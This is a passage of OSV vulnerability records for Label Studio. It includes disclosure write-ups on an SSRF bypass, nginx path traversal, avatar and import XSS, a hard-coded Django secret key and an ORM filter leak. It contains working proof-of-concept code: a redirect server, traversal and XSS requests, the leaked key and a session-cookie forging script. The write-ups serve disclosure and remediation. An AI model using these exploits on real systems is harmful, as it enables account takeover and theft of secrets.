CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in 